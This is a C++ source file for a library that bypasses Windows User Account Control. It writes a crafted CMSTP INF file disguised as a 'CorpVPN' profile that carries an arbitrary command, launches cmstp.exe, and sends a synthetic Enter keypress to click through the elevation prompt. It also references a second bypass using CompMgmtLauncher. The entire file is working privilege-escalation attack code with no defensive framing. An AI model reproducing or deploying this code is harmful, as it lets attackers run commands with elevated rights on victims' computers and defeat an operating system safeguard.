// BypassUAC.cpp : Defines the functions for the static library.
//

#include "pch.h"

BOOL CALLBACK EnumWindowsCallback
(
	_In_ HWND   hWnd,
	_In_ LPARAM lParam
)
{
	DWORD dwPID = 0;
	PWINDOWS_INFO pStruct = (PWINDOWS_INFO)lParam;
	WCHAR wszWindowName[0x200];
	INPUT Inputs[2];

	GetWindowThreadProcessId(hWnd, &dwPID);
	if (dwPID == pStruct->dwPID) {
		SecureZeroMemory(wszWindowName, sizeof(wszWindowName));
		GetWindowTextW(hWnd, wszWindowName, _countof(wszWindowName));
		if (!lstrcmpW(wszWindowName, pStruct->wszWindowsName)) {
			SetForegroundWindow(hWnd);
			SecureZeroMemory(&Inputs, sizeof(Inputs));
			Inputs[0].type = INPUT_KEYBOARD;
			Inputs[0].ki.wVk = VK_RETURN;
			Inputs[0].ki.dwFlags = KEYEVENTF_EXTENDEDKEY;

			Inputs[1].type = INPUT_KEYBOARD;
			Inputs[1].ki.wVk = VK_RETURN;
			Inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;

			SendInput(_countof(Inputs), Inputs, sizeof(INPUT));
			pStruct->bIsOk = TRUE;
			return FALSE;
		}
	}

	pStruct->bIsOk = FALSE;
	return TRUE;
}

VOID WaitWindowActive
(
	DWORD dwPid
)
{
	WINDOWS_INFO Struct;

	SecureZeroMemory(&Struct, sizeof(Struct));
	Struct.dwPID = dwPid;
	StrCpyW(Struct.wszWindowsName, L"CorpVPN");
	while (TRUE) {
		EnumWindows(EnumWindowsCallback, &Struct);
		if (Struct.bIsOk) {
			break;
		}
	}
}

VOID BypassByCmstp
(
	_In_ LPSTR lpCommand
)
{
	WCHAR wszTempPath[MAX_PATH];
	LPWSTR lpTempFile = NULL;
	HANDLE hProcess = NULL;
	DWORD dwPid = 0;
	LPWSTR CmstpCommands[] = {L"cmstp.exe", L"/au", NULL};
	CHAR szFormat[] = "[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall]\nCustomDestination=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n\n[RunPreSetupCommandsSection]\n%s\ntaskkill / F / IM cmstp.exe\n\n[CustInstDestSectionAllUsers]\n49000,49001=AllUSer_LDIDSection, 7\n\n[AllUSer_LDIDSection]\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \" % UnexpectedError % \", \"\"\n\n[Strings]\nServiceName=\"CorpVPN\"\nShortSvcName=\"CorpVPN\"";
	CHAR szInfData[0x1000];
	StringCbPrintfA(szInfData, _countof(szInfData), szFormat, lpCommand);
	GenerateTempPathW(L"CorpVPN.inf", NULL, NULL, &lpTempFile);
	if (!WriteToFile(lpTempFile, szInfData, strlen(szInfData))) {
		goto END;
	}

	CmstpCommands[2] = lpTempFile;
	if (!Run(CmstpCommands, _countof(CmstpCommands), &hProcess)) {
		goto END;
	}

	if (hProcess != NULL) {
		dwPid = GetProcessId(hProcess);
		WaitWindowActive(dwPid);
	}
END:
	FREE(lpTempFile);
	if (hProcess != NULL) {
		CloseHandle(hProcess);
	}
}

// TODO: This is an example of a library function
VOID BypassUAC
(
	_In_ BypassType Type,
	_In_ LPSTR lpCommand
)
{
	switch (Type)
	{
	case Cmstp:
		BypassByCmstp(lpCommand);
		break;
	case compMgmtLauncher:
		BypassBycomMgmtLauncher(lpCommand);
		break;
	default:
		break;
	}
}
